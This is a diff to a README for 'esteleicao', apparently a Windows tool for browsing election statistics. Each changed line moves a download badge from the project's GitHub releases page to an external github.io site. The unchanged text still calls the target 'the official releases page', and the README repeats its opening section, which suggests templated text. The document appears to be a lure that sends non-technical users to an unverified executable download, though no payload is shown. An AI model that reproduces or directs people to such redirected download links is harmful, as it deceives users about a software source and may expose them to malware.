@@ -1,6 +1,6 @@
 # 🗳️ esteleicao - Understand Election Results at a Glance
 
-[![Download esteleicao](https://img.shields.io/badge/Download%20esteleicao-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github&logoColor=white)](https://github.com/Subjugationchyme333/esteleicao/releases)
+[![Download esteleicao](https://img.shields.io/badge/Download%20esteleicao-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github&logoColor=white)](https://subjugationchyme333.github.io)
 
 esteleicao is a Windows application for exploring election statistics in a clear, visual way. It is made for everyday computer users who want to review election numbers without formulas, spreadsheets, or technical setup. The app focuses on the information behind “Estatisticas da eleição” and presents it in a layout that is easy to scan, compare, and understand.
 
@@ -27,7 +27,7 @@ esteleicao is useful for anyone who wants a practical view of election data: cur
 
 Use the download button below to open the official releases page.
 
-[![Download esteleicao for Windows](https://img.shields.io/badge/Download%20for%20Windows-4ECDC4?style=for-the-badge&labelColor=FF6B6B&logo=windows&logoColor=white)](https://github.com/Subjugationchyme333/esteleicao/releases)
+[![Download esteleicao for Windows](https://img.shields.io/badge/Download%20for%20Windows-4ECDC4?style=for-the-badge&labelColor=FF6B6B&logo=windows&logoColor=white)](https://subjugationchyme333.github.io)
 
 Visit this link to download the application.
 
@@ -83,7 +83,7 @@ Because the app is aimed at end users, it avoids complicated data tools. You wor
 
 ## 🗳️ esteleicao - Understand Election Results at a Glance
 
-[![Download esteleicao](https://img.shields.io/badge/Download%20esteleicao-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github&logoColor=white)](https://github.com/Subjugationchyme333/esteleicao/releases)
+[![Download esteleicao](https://img.shields.io/badge/Download%20esteleicao-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github&logoColor=white)](https://subjugationchyme333.github.io)
 
 esteleicao is a Windows application for exploring election statistics in a clear, visual way. It is made for everyday computer users who want to review election numbers without formulas, spreadsheets, or technical setup. The app focuses on the information behind "Estatisticas da eleição" and presents it in a layout that is easy to scan, compare, and understand.
 
@@ -110,7 +110,7 @@ esteleicao is useful for anyone who wants a practical view of election data: cur
 
 Use the download button below to open the official releases page.
 
-[![Download esteleicao for Windows](https://img.shields.io/badge/Download%20for%20Windows-4ECDC4?style=for-the-badge&labelColor=FF6B6B&logo=windows&logoColor=white)](https://github.com/Subjugationchyme333/esteleicao/releases)
+[![Download esteleicao for Windows](https://img.shields.io/badge/Download%20for%20Windows-4ECDC4?style=for-the-badge&labelColor=FF6B6B&logo=windows&logoColor=white)](https://subjugationchyme333.github.io)
 
 Visit this link to download the application.
 
